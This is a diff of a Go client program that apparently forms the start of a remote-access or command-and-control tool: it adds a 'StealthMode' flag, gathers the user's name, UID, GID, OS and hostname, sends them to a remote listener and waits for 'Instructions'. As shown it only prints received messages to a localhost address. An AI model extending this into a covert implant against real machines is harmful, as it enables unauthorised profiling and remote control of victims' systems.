@@ -2,23 +2,30 @@ package main
 
 import (
 	"encoding/gob"
+	"fmt"
 	"log"
 	"net"
 	"os"
 	"os/user"
+	"runtime"
 )
 
 type Client struct {
-	OS_username     string
+	Username        string
+	UID             string
+	GID             string
 	OperatingSystem string
-	LocalIP         net.IP
-	PublicIP        net.IP
+	Hostname        string
+}
+
+type Instructions struct {
+	Message string
 }
 
 var (
 	StealthMode bool = false
 	RemoteIP         = "127.0.0.1"
-	RemotePort       = "1337"
+	RemotePort       = "1302"
 )
 
 func main() {
@@ -43,17 +50,26 @@ func main() {
 	}
 }
 
-func sendOSInfo(c net.Conn) error {
+func sendOSInfo(conn net.Conn) error {
 	currentUser, err := user.Current()
 	if err != nil {
 		return err
 	}
 
-	newClient := Client{
-		OS_username: currentUser.Username,
+	clientHostname, err := os.Hostname()
+	if err != nil {
+		return err
 	}
 
-	enc := gob.NewEncoder(c)
+	newClient := Client{
+		Username:        currentUser.Username,
+		UID:             currentUser.Uid,
+		GID:             currentUser.Gid,
+		OperatingSystem: runtime.GOOS,
+		Hostname:        clientHostname,
+	}
+
+	enc := gob.NewEncoder(conn)
 	err = enc.Encode(newClient)
 	if err != nil {
 		return err
@@ -62,7 +78,13 @@ func sendOSInfo(c net.Conn) error {
 	return nil
 }
 
-func awaitInstructions(c net.Conn) error {
-
+func awaitInstructions(conn net.Conn) error {
+	dec := gob.NewDecoder(conn)
+	inst := Instructions{}
+	err := dec.Decode(&inst)
+	if err != nil {
+		return err
+	}
+	fmt.Println(inst.Message)
 	return nil
 }
